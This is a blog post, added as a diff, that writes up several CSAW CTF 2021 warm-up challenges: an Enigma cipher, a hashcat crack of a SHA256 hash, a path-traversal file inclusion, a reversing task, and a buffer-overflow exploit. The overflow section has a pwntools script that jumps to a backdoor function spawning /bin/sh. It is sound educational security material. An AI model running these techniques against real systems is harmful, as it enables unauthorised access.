@@ -1,0 +1,64 @@
+<!doctype html><html><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title> rdk31's blog </title><link href=https://rdk31.com/fonts.css rel=stylesheet><script async data-goatcounter=https://rdk31.goatcounter.com/count src=https://rdk31.com/js/count.js></script><noscript><img src="https://rdk31.goatcounter.com//count?p=/posts/csawctf2021-warm-up/&t=CSAW CTF Qualification Round 2021 - warm-up"></noscript><link title="rdk31's blog" href=https://rdk31.com/atom.xml rel=alternate type=application/atom+xml><link href=https://rdk31.com/theme/light.css rel=stylesheet><link media="(prefers-color-scheme: dark)" href=https://rdk31.com/theme/dark.css rel=stylesheet><link href=https://rdk31.com/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://rdk31.com>rdk31's blog</a></div><nav><a style="margin-left: 0.7em" href=/posts>/posts</a><a style="margin-left: 0.7em" href=/tags>/tags</a><a style="margin-left: 0.7em" href=/about>/about</a></nav></header><main><article><div class=title><div class=page-header>CSAW CTF Qualification Round 2021 - warm-up<span style="font-size: 1.6em" class=primary-color>.</span></div><div class=meta>Posted on 2021-09-13</div></div><section class=body><h1 id=turing>Turing</h1><h2 id=task-description>Task description</h2><p>Recruiting the next Turing. See if you can break this historic cipher! Ciphertext: <code>jmodtrr_tdwumtu_cydy_ynsldf</code> You might need this: M3 UKW B<h2 id=solution>Solution</h2><p><a href=https://cryptii.com/pipes/enigma-decoder>enigma online decoder</a> <br> foreign chars: include<p>flag: <code>flag{scruffy_looking_nerf_herder}</code><h1 id=crack-me>Crack Me</h1><h2 id=task-description-1>Task description</h2><p>Can you crack this? Your hash: <code>a60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c</code>. Your salt: the encryption method of the hash. (So if the hash is of the word example, you would submit flag{example} to score points.) UPDATE Friday 9PM: To streamline your efforts we would like to give you some more details about the format for the hash encryption method. An example: if you think the hash is RIPEMD-128, use ripemd128 for the salt.<h2 id=solution-1>Solution</h2><p>Using <a href=https://hashes.com/en/tools/hash_identifier>hash identifier</a> I found out that it's a SHA256 hash.<p>Then I created a file for hashcat with the possible hashes (that was before the hint was added).<pre style=background-color:#2b303b;color:#c0c5ce;><code><span>A60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c:sha256
+</span><span>A60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c:SHA256
+</span></code></pre><p>And run it on the rockyou wordlist (-m flag explained <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a>): <br> <code>hashcat -m 1420 --show hashes.txt /usr/share/wordlists/rockyou.txt</code><p>The output: <br> <code>a60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c:sha256:cathouse</code><p>Therefore, the flag is: <code>flag{cathouse}</code><h1 id=poem-collection>poem-collection</h1><h2 id=task-description-2>Task description</h2><p>Hey! I made a cool website that shows off my favorite poems. See if you can find flag.txt somewhere!<h2 id=solution-2>Solution</h2><p>Unfortunately, the organizers took the ctf's infrastructure down right after it ended but basically the site was printing out a file based on the parameter poem. For example: <code>http://web.chal.csaw.io:5003/poems/?poem=poem.txt</code>. In addition, the first time you browse to the site (without any parameter) you see this warning <code>Warning: file_get_contents(): Filename cannot be empty in /var/www/html/poems/index.php on line 4</code>.<p>My first try was: <code>http://web.chal.csaw.io:5003/poems/?poem=index.php</code> which dumped the site's code. Then I just tried out <code>flag.txt</code> and <code>../flag.txt</code> which worked.<p>The flag: <code>flag{l0c4l_f1l3_1nclusi0n_f0r_7h3_w1n}</code><h1 id=password-checker>Password Checker</h1><h2 id=task-description-3>Task description</h2><p>Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)<p><a href=files/password_checker>password_checker</a><h2 id=solution-3>Solution</h2><p>Opening it up in ghidra, we see this decompiled code:<pre class=language-c data-lang=c style=background-color:#2b303b;color:#c0c5ce;><code class=language-c data-lang=c><span>undefined8 </span><span style=color:#8fa1b3;>main</span><span>(EVP_PKEY_CTX *</span><span style=color:#bf616a;>param_1</span><span>)
+</span><span>{
+</span><span>  </span><span style=color:#bf616a;>init</span><span>(param_1);
+</span><span>  </span><span style=color:#bf616a;>password_checker</span><span>();
+</span><span>  </span><span style=color:#b48ead;>return </span><span style=color:#d08770;>0</span><span>;
+</span><span>}
+</span><span>
+</span><span style=color:#b48ead;>void </span><span style=color:#8fa1b3;>password_checker</span><span>(</span><span style=color:#b48ead;>void</span><span>)
+</span><span>{
+</span><span>  undefined8 local_a8;
+</span><span>  undefined local_a0;
+</span><span>  </span><span style=color:#b48ead;>char</span><span> local_78 [</span><span style=color:#d08770;>48</span><span>];
+</span><span>  </span><span style=color:#b48ead;>char</span><span> local_48 [</span><span style=color:#d08770;>60</span><span>];
+</span><span>  </span><span style=color:#b48ead;>int</span><span> local_c;
+</span><span>
+</span><span>  </span><span style=color:#96b5b4;>printf</span><span>("</span><span style=color:#a3be8c;>Enter the password to get in: </span><span style=color:#96b5b4;>\n</span><span style=color:#a3be8c;>></span><span>");
+</span><span>  </span><span style=color:#96b5b4;>gets</span><span>(local_48);
+</span><span>  </span><span style=color:#96b5b4;>strcpy</span><span>(local_78,local_48);
+</span><span>  local_a8 = </span><span style=color:#d08770;>0x64726f7773736170</span><span>;
+</span><span>  local_a0 = </span><span style=color:#d08770;>0</span><span>;
+</span><span>  local_c = </span><span style=color:#96b5b4;>strcmp</span><span>(local_78,(</span><span style=color:#b48ead;>char </span><span>*)&local_a8);
+</span><span>  </span><span style=color:#b48ead;>if </span><span>(local_c == </span><span style=color:#d08770;>0</span><span>) {
+</span><span>    </span><span style=color:#96b5b4;>printf</span><span>("</span><span style=color:#a3be8c;>You got in!!!!</span><span>");
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead;>else </span><span>{
+</span><span>    </span><span style=color:#96b5b4;>printf</span><span>("</span><span style=color:#a3be8c;>This is not the password</span><span>");
+</span><span>  }
+</span><span>  </span><span style=color:#b48ead;>return</span><span>;
+</span><span>}
+</span></code></pre><p>In addition, we find a very convenient function included.<pre class=language-c data-lang=c style=background-color:#2b303b;color:#c0c5ce;><code class=language-c data-lang=c><span style=color:#b48ead;>void </span><span style=color:#8fa1b3;>backdoor</span><span>(</span><span style=color:#b48ead;>void</span><span>)
+</span><span>{
+</span><span>  </span><span style=color:#96b5b4;>system</span><span>("</span><span style=color:#a3be8c;>/bin/sh</span><span>");
+</span><span>  </span><span style=color:#b48ead;>return</span><span>;
+</span><span>}
+</span></code></pre><p>So, the password checking thing is a diversion, what we're really interested in is the fact that the application uses <code>gets</code> to read the line. Stack buffer overflow!<p>Now, to the exploitation. First, generate a cyclic pattern a bit longer than the buffer <code>gets</code> writes to:<pre style=background-color:#2b303b;color:#c0c5ce;><code><span>pwn cyclic 80
+</span><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
+</span></code></pre><p>Then, run load the app in gdb and enter the pattern. We get the expected segfault. Let's read the $rsp:<pre style=background-color:#2b303b;color:#c0c5ce;><code><span>(gdb) x/x $rsp
+</span><span>0x7fffffffdf28: 0x61616173
+</span></code></pre><p>Get the length:<pre style=background-color:#2b303b;color:#c0c5ce;><code><span>pwn cyclic -l 0x61616173
+</span><span>72
+</span></code></pre><p>The last thing we need is the backdoor function's address:<pre style=background-color:#2b303b;color:#c0c5ce;><code><span>(gdb) info address backdoor
+</span><span>Symbol "backdoor" is at 0x401172 in a file compiled without debugging.
+</span></code></pre><p>The exploit:<pre class=language-py3 data-lang=py3 style=background-color:#2b303b;color:#c0c5ce;><code class=language-py3 data-lang=py3><span style=color:#b48ead;>from </span><span>pwn </span><span style=color:#b48ead;>import </span><span style=color:#d08770;>*
+</span><span>
+</span><span style=color:#65737e;># io = process("./password_checker")
+</span><span>io = </span><span style=color:#bf616a;>remote</span><span>("</span><span style=color:#a3be8c;>pwn.chal.csaw.io</span><span>", </span><span style=color:#d08770;>5000</span><span>)
+</span><span>
+</span><span>payload = </span><span style=color:#b48ead;>b</span><span>"</span><span style=color:#a3be8c;>A</span><span>" * </span><span style=color:#d08770;>72 </span><span style=color:#65737e;># or just use cyclic_find(0x61616173)
+</span><span>payload += </span><span style=color:#bf616a;>p64</span><span>(</span><span style=color:#d08770;>0x00401172</span><span>)
+</span><span>
+</span><span>io.</span><span style=color:#bf616a;>sendline</span><span>(payload)
+</span><span>
+</span><span>io.</span><span style=color:#bf616a;>interactive</span><span>()
+</span></code></pre><p>The flag: <code>flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}</code><h1 id=checker>checker</h1><h2 id=task-description-4>Task description</h2><p>What's up with all the zeros and ones? Where are my letters and numbers? (This is a reversing challenge.)<p><a href=files/checker.py>checker.py</a><h2 id=solution-4>Solution</h2><p>I just reversed the algorithm in the main function by adding these lines after the definition of the encrypted flag:<pre class=language-py3 data-lang=py3 style=background-color:#2b303b;color:#c0c5ce;><code class=language-py3 data-lang=py3><span>encoded = encoded[::-</span><span style=color:#d08770;>1</span><span>]
+</span><span>encoded = </span><span style=color:#bf616a;>right</span><span>(encoded, </span><span style=color:#d08770;>24</span><span>)
+</span><span>encoded = </span><span style=color:#bf616a;>down</span><span>(encoded)
+</span><span>encoded = </span><span style=color:#bf616a;>right</span><span>(encoded, </span><span style=color:#96b5b4;>len</span><span>(encoded) - </span><span style=color:#d08770;>24</span><span>)
+</span><span>
+</span><span style=color:#b48ead;>for </span><span>i </span><span style=color:#b48ead;>in </span><span style=color:#96b5b4;>range</span><span>(</span><span style=color:#d08770;>0</span><span>, </span><span style=color:#96b5b4;>len</span><span>(encoded), </span><span style=color:#d08770;>8</span><span>):
+</span><span>    c = </span><span style=color:#bf616a;>int</span><span>(encoded[i : i + </span><span style=color:#d08770;>8</span><span>], </span><span style=color:#bf616a;>base</span><span>=</span><span style=color:#d08770;>2</span><span>)
+</span><span>    </span><span style=color:#96b5b4;>print</span><span>(</span><span style=color:#96b5b4;>chr</span><span>(c >> </span><span style=color:#d08770;>1</span><span>), </span><span style=color:#bf616a;>end</span><span>="")
+</span></code></pre><p>The flag: <code>flag{r3vers!nG_w@rm_Up}</code></section></article></main><div class=post-footer><div class=post-tags>tags: <a href=https://rdk31.com/tags/ctf/>#ctf</a></div><div class=post-nav><a class=previous href=https://rdk31.com/posts/csawctf2021-weak-password/>‹ CSAW CTF Qualification Round 2021 - Weak Password</a><a class=next href=https://rdk31.com/posts/csawctf2021-ncore/>CSAW CTF Qualification Round 2021 - ncore ›</a></div></div></div>
